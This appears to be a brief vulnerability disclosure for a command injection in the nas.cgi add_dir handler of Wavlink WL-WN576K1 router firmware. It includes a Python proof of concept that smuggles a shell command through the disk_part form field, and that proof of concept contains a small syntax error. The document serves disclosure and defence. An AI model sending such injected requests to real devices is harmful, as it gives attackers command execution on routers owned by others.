# command injection

## WAVLINK_WL_WN576K1

version: 20220801

## Description:

There is a command injection in nas.cgi/add_dir

## Source:

you may download it from : 

[WL-WN576K1 - WAVLINK See the world! Powered by Wavlink](https://www.wavlink.com/en_us/firmware/details/5ce8519bd8.html)

## Analyse:

![](10.png)

get value from disk_part, then call do_system, cause command injection

## POC

```
url = "http://192.168.0.1/cgi-bin/nas.cgi"
payload = ';ls > /tmp/1  ;' + '\n'

r = requests.post(url, data={ 'page':'adddir', 'disk_part': + payload})
```
